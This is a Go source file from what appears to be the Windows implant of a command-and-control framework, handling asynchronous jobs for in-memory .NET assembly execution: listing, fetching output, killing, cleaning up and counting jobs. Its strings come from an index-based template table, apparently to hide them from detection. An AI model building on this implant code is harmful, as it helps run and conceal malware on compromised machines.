// server/docker/payloads/Windows/action_inline_assembly_async.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"strings"
	"sync"
	"time"
)

// InlineAssemblyJobs template indices (must match server's common.go)
// Uses shared template from action_inline_assembly.go via iaTpl()
const (
	// Command names
	idxIACmdJobs   = 421
	idxIACmdOutput = 422
	idxIACmdKill   = 423
	idxIACmdClean  = 424
	idxIACmdStats  = 425

	// Status strings
	idxIAStatusRunning   = 426
	idxIAStatusCompleted = 427
	idxIAStatusFailed    = 428
	idxIAStatusKilled    = 429
	idxIAStatusTimeout   = 430

	// Format components
	idxIAFmtRunningPrefix = 431
	idxIAFmtDonePrefix    = 432
	idxIAFmtDash          = 433
	idxIAFmtPipe          = 434
	idxIAFmtNewline       = 435
	idxIAFmtEllipsis      = 436
	idxIAFmtColSep        = 437
	idxIAFmtZero          = 438
	idxIAFmtOne           = 439
	idxIAFmtColon         = 440

	// Stats labels
	idxIAStatsHeader   = 442
	idxIAStatsTotalLbl = 443
	idxIAStatsRunLbl   = 444
	idxIAStatsCompLbl  = 445
	idxIAStatsFailLbl  = 446
	idxIAStatsKillLbl  = 447
	idxIAStatsTimeLbl  = 448
)

// Convenience functions for job command strings with fallbacks
func iasStatusRunning() string {
	if s := iaTpl(idxIAStatusRunning); s != "" {
		return s
	}
	return "running"
}

func iasStatusCompleted() string {
	if s := iaTpl(idxIAStatusCompleted); s != "" {
		return s
	}
	return "completed"
}

func iasStatusFailed() string {
	if s := iaTpl(idxIAStatusFailed); s != "" {
		return s
	}
	return "failed"
}

func iasStatusKilled() string {
	if s := iaTpl(idxIAStatusKilled); s != "" {
		return s
	}
	return "killed"
}

func iasStatusTimeout() string {
	if s := iaTpl(idxIAStatusTimeout); s != "" {
		return s
	}
	return "timeout"
}

func iasFmtRunningPrefix() string {
	if s := iaTpl(idxIAFmtRunningPrefix); s != "" {
		return s
	}
	return "r:"
}

func iasFmtDonePrefix() string {
	if s := iaTpl(idxIAFmtDonePrefix); s != "" {
		return s
	}
	return "d:"
}

func iasFmtDash() string {
	if s := iaTpl(idxIAFmtDash); s != "" {
		return s
	}
	return "-"
}

func iasFmtPipe() string {
	if s := iaTpl(idxIAFmtPipe); s != "" {
		return s
	}
	return "|"
}

func iasFmtNewline() string {
	if s := iaTpl(idxIAFmtNewline); s != "" {
		return s
	}
	return "\n"
}

func iasFmtEllipsis() string {
	if s := iaTpl(idxIAFmtEllipsis); s != "" {
		return s
	}
	return "..."
}

func iasFmtColSep() string {
	if s := iaTpl(idxIAFmtColSep); s != "" {
		return s
	}
	return " | "
}

func iasFmtZero() string {
	if s := iaTpl(idxIAFmtZero); s != "" {
		return s
	}
	return "0"
}

func iasFmtOne() string {
	if s := iaTpl(idxIAFmtOne); s != "" {
		return s
	}
	return "1"
}

func iasFmtColon() string {
	if s := iaTpl(idxIAFmtColon); s != "" {
		return s
	}
	return ":"
}

func iasStatsHeader() string {
	if s := iaTpl(idxIAStatsHeader); s != "" {
		return s
	}
	return "Stats:\n"
}

func iasStatsTotalLbl() string {
	if s := iaTpl(idxIAStatsTotalLbl); s != "" {
		return s
	}
	return "Total Jobs:     "
}

func iasStatsRunLbl() string {
	if s := iaTpl(idxIAStatsRunLbl); s != "" {
		return s
	}
	return "Running:        "
}

func iasStatsCompLbl() string {
	if s := iaTpl(idxIAStatsCompLbl); s != "" {
		return s
	}
	return "Completed:      "
}

func iasStatsFailLbl() string {
	if s := iaTpl(idxIAStatsFailLbl); s != "" {
		return s
	}
	return "Failed:         "
}

func iasStatsKillLbl() string {
	if s := iaTpl(idxIAStatsKillLbl); s != "" {
		return s
	}
	return "Killed:         "
}

func iasStatsTimeLbl() string {
	if s := iaTpl(idxIAStatsTimeLbl); s != "" {
		return s
	}
	return "Timeout:        "
}

// AssemblyJob represents an async assembly execution job
type AssemblyJob struct {
	ID              string
	CommandID       string
	CommandDBID     int
	AgentID         string
	Name            string
	Status          string // "running", "completed", "failed", "killed"
	StartTime       time.Time
	EndTime         *time.Time
	Output          strings.Builder
	Error           error
	CancelChan      chan bool
	OutputMutex     sync.Mutex
	Command         Command
	OutputTruncated bool
	TotalBytesSent  int
	Process         *os.Process
	TokenContext    *AssemblyTokenContext
}

// AssemblyJobManager manages async assembly jobs
type AssemblyJobManager struct {
	jobs map[string]*AssemblyJob
	mu   sync.RWMutex
}

var assemblyJobManager = &AssemblyJobManager{
	jobs: make(map[string]*AssemblyJob),
}

// InlineAssemblyJobsCommand lists running assembly jobs
type InlineAssemblyJobsCommand struct{}

func (c *InlineAssemblyJobsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	return executeAssemblyJobsList()
}

// InlineAssemblyOutputCommand retrieves output from an assembly job
type InlineAssemblyOutputCommand struct{}

func (c *InlineAssemblyOutputCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	jobID := args[0]

	// Get the job
	job, exists := GetAssemblyJob(jobID)
	if !exists {
		// Try partial match
		jobs := assemblyJobManager.ListJobs()
		for _, j := range jobs {
			if strings.HasPrefix(j.ID, jobID) {
				job = j
				exists = true
				break
			}
		}

		if !exists {
			return CommandResult{
				Output:      ErrCtx(E26, jobID),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
	}

	// Lock and get output
	job.OutputMutex.Lock()
	output := job.Output.String()
	status := job.Status
	truncated := job.OutputTruncated
	bufferSize := job.Output.Len()
	job.OutputMutex.Unlock()

	// Build compact response - client formats
	// Format: job_id|status|truncated(0/1)|duration_or_running|buffer_bytes|output
	var result strings.Builder

	truncatedFlag := iasFmtZero()
	if truncated {
		truncatedFlag = iasFmtOne()
	}

	var durationStr string
	if status == iasStatusRunning() {
		duration := time.Since(job.StartTime).Round(time.Second)
		durationStr = iasFmtRunningPrefix() + duration.String() + iasFmtColon() + fmt.Sprintf("%d", bufferSize)
	} else if job.EndTime != nil {
		duration := job.EndTime.Sub(job.StartTime).Round(time.Second)
		durationStr = iasFmtDonePrefix() + duration.String()
	} else {
		durationStr = iasFmtDash()
	}

	result.WriteString(job.ID + iasFmtPipe() + status + iasFmtPipe() + truncatedFlag + iasFmtPipe() + durationStr + iasFmtNewline())

	// Add the actual output
	if output == "" {
		result.WriteString(Succ(S18))
	} else {
		result.WriteString(output)
	}

	return CommandResult{
		Output:      result.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// InlineAssemblyKillCommand terminates an assembly job
type InlineAssemblyKillCommand struct{}

func (c *InlineAssemblyKillCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	jobID := args[0]
	return executeAssemblyKillJob(jobID)
}

// executeAssemblyJobsList lists all assembly jobs
func executeAssemblyJobsList() CommandResult {
	jobs := assemblyJobManager.ListJobs()

	if len(jobs) == 0 {
		return CommandResult{
			Output:   Succ(S0),
			ExitCode: 0,
		}
	}

	var output strings.Builder
	output.WriteString(Table(TJobs, len(jobs)) + "\n")

	now := time.Now()
	for _, job := range jobs {
		job.OutputMutex.Lock()
		duration := now.Sub(job.StartTime)
		if job.EndTime != nil {
			duration = job.EndTime.Sub(job.StartTime)
		}

		durationStr := duration.Round(time.Second).String()

		// Truncate name if too long
		name := job.Name
		if len(name) > 19 {
			name = name[:16] + iasFmtEllipsis()
		}

		output.WriteString(fmt.Sprintf("%-24s", job.ID[:min(24, len(job.ID))]) + iasFmtColSep() +
			fmt.Sprintf("%-19s", name) + iasFmtColSep() +
			fmt.Sprintf("%-11s", job.Status) + iasFmtColSep() +
			fmt.Sprintf("%-16s", durationStr) + iasFmtNewline())
		job.OutputMutex.Unlock()
	}

	return CommandResult{
		Output:   output.String(),
		ExitCode: 0,
	}
}

// executeAssemblyGetOutput retrieves output from a job
func executeAssemblyGetOutput(jobID string) CommandResult {
	job := assemblyJobManager.GetJob(jobID)
	if job == nil {
		// Try partial match
		jobs := assemblyJobManager.ListJobs()
		for _, j := range jobs {
			if strings.HasPrefix(j.ID, jobID) {
				job = j
				break
			}
		}
	}

	if job == nil {
		return CommandResult{
			Output:   ErrCtx(E26, jobID),
			ExitCode: 1,
		}
	}

	job.OutputMutex.Lock()
	output := job.Output.String()
	status := job.Status
	truncated := job.OutputTruncated
	job.OutputMutex.Unlock()

	// Compact output format - client expands
	// Format: status_code|job_id|truncated(0/1)|output
	truncatedFlag := iasFmtZero()
	if truncated {
		truncatedFlag = iasFmtOne()
	}

	if output == "" {
		// S18 = no output yet
		output = Succ(S18) + iasFmtPipe() + job.ID + iasFmtPipe() + status + iasFmtPipe() + truncatedFlag + iasFmtPipe()
	} else {
		output = Succ(S5) + iasFmtPipe() + job.ID + iasFmtPipe() + status + iasFmtPipe() + truncatedFlag + iasFmtNewline() + output
	}

	return CommandResult{
		Output:   output,
		ExitCode: 0,
		JobID:    jobID,
	}
}

// executeAssemblyKillJob terminates a running job
func executeAssemblyKillJob(jobID string) CommandResult {
	job := assemblyJobManager.GetJob(jobID)
	if job == nil {
		// Try partial match
		jobs := assemblyJobManager.ListJobs()
		for _, j := range jobs {
			if strings.HasPrefix(j.ID, jobID) {
				job = j
				break
			}
		}
	}

	if job == nil {
		return CommandResult{
			Output:   ErrCtx(E26, jobID),
			ExitCode: 1,
		}
	}

	if job.Status != iasStatusRunning() {
		return CommandResult{
			Output:   ErrCtx(E27, job.ID),
			ExitCode: 1,
		}
	}

	// Send cancel signal
	select {
	case job.CancelChan <- true:
		time.Sleep(100 * time.Millisecond)

		// Mark as killed
		assemblyJobManager.mu.Lock()
		job.Status = iasStatusKilled()
		endTime := time.Now()
		job.EndTime = &endTime
		assemblyJobManager.mu.Unlock()

		return CommandResult{
			Output:   SuccCtx(S2, job.ID),
			ExitCode: 0,
			JobID:    jobID,
		}
	default:
		return CommandResult{
			Output:   Err(E47),
			ExitCode: 1,
		}
	}
}

// Helper methods for AssemblyJobManager
func (ajm *AssemblyJobManager) AddJob(job *AssemblyJob) {
	ajm.mu.Lock()
	defer ajm.mu.Unlock()
	ajm.jobs[job.ID] = job
}

func (ajm *AssemblyJobManager) GetJob(jobID string) *AssemblyJob {
	ajm.mu.RLock()
	defer ajm.mu.RUnlock()
	return ajm.jobs[jobID]
}

func (ajm *AssemblyJobManager) ListJobs() []*AssemblyJob {
	ajm.mu.RLock()
	defer ajm.mu.RUnlock()

	jobs := make([]*AssemblyJob, 0, len(ajm.jobs))
	for _, job := range ajm.jobs {
		jobs = append(jobs, job)
	}
	return jobs
}

func (ajm *AssemblyJobManager) RemoveJob(jobID string) {
	ajm.mu.Lock()
	defer ajm.mu.Unlock()
	delete(ajm.jobs, jobID)
}

func (ajm *AssemblyJobManager) CleanupOldJobs(maxAge time.Duration) {
	ajm.mu.Lock()
	defer ajm.mu.Unlock()

	now := time.Now()
	for id, job := range ajm.jobs {
		if job.Status != iasStatusRunning() && job.EndTime != nil {
			if now.Sub(*job.EndTime) > maxAge {
				delete(ajm.jobs, id)
			}
		}
	}
}

// CleanupCompletedJobs removes all completed jobs and returns count
func (ajm *AssemblyJobManager) CleanupCompletedJobs() int {
	ajm.mu.Lock()
	defer ajm.mu.Unlock()

	cleaned := 0
	for id, job := range ajm.jobs {
		if job.Status != iasStatusRunning() {
			delete(ajm.jobs, id)
			cleaned++
		}
	}

	return cleaned
}

// InlineAssemblyJobsCleanCommand cleans up completed/killed assembly jobs
type InlineAssemblyJobsCleanCommand struct{}

func (c *InlineAssemblyJobsCleanCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		// Clean all non-running jobs
		return executeAssemblyJobsCleanAll()
	}
	// Clean specific job
	return executeAssemblyJobsCleanSpecific(args[0])
}

func executeAssemblyJobsCleanAll() CommandResult {
	cleaned := assemblyJobManager.CleanupCompletedJobs()

	if cleaned == 0 {
		return CommandResult{
			Output:   Succ(S0),
			ExitCode: 0,
		}
	}

	return CommandResult{
		Output:   SuccCtx(S17, fmt.Sprintf("%d", cleaned)),
		ExitCode: 0,
	}
}

func executeAssemblyJobsCleanSpecific(jobID string) CommandResult {
	job := assemblyJobManager.GetJob(jobID)
	if job == nil {
		// Try partial match
		jobs := assemblyJobManager.ListJobs()
		for _, j := range jobs {
			if strings.HasPrefix(j.ID, jobID) {
				job = j
				break
			}
		}
	}

	if job == nil {
		return CommandResult{
			Output:   ErrCtx(E26, jobID),
			ExitCode: 1,
		}
	}

	if job.Status == iasStatusRunning() {
		return CommandResult{
			Output:   ErrCtx(E27, job.ID),
			ExitCode: 1,
		}
	}

	assemblyJobManager.RemoveJob(job.ID)

	return CommandResult{
		Output:   SuccCtx(S2, job.ID),
		ExitCode: 0,
	}
}

// InlineAssemblyJobsStatsCommand shows job statistics
type InlineAssemblyJobsStatsCommand struct{}

func (c *InlineAssemblyJobsStatsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	return executeAssemblyJobsStats()
}

func executeAssemblyJobsStats() CommandResult {
	jobs := assemblyJobManager.ListJobs()

	if len(jobs) == 0 {
		return CommandResult{
			Output:   Succ(S0),
			ExitCode: 0,
		}
	}

	stats := struct {
		Total     int
		Running   int
		Completed int
		Failed    int
		Killed    int
		Timeout   int
	}{
		Total: len(jobs),
	}

	for _, job := range jobs {
		switch job.Status {
		case iasStatusRunning():
			stats.Running++
		case iasStatusCompleted():
			stats.Completed++
		case iasStatusFailed():
			stats.Failed++
		case iasStatusKilled():
			stats.Killed++
		case iasStatusTimeout():
			stats.Timeout++
		}
	}

	var output strings.Builder
	output.WriteString(iasStatsHeader())
	output.WriteString(iasStatsTotalLbl() + fmt.Sprintf("%d", stats.Total) + iasFmtNewline())
	output.WriteString(iasStatsRunLbl() + fmt.Sprintf("%d", stats.Running) + iasFmtNewline())
	output.WriteString(iasStatsCompLbl() + fmt.Sprintf("%d", stats.Completed) + iasFmtNewline())
	output.WriteString(iasStatsFailLbl() + fmt.Sprintf("%d", stats.Failed) + iasFmtNewline())
	output.WriteString(iasStatsKillLbl() + fmt.Sprintf("%d", stats.Killed) + iasFmtNewline())
	output.WriteString(iasStatsTimeLbl() + fmt.Sprintf("%d", stats.Timeout) + iasFmtNewline())

	return CommandResult{
		Output:   output.String(),
		ExitCode: 0,
	}
}

// GetAssemblyJob is a helper function to get a job by ID
func GetAssemblyJob(jobID string) (*AssemblyJob, bool) {
	assemblyJobManager.mu.RLock()
	defer assemblyJobManager.mu.RUnlock()

	job, exists := assemblyJobManager.jobs[jobID]
	return job, exists
}

// Initialize cleanup routine for assembly jobs
func init() {
	go func() {
		ticker := time.NewTicker(1 * time.Hour)
		defer ticker.Stop()

		for range ticker.C {
			assemblyJobManager.CleanupOldJobs(24 * time.Hour)
		}
	}()
}
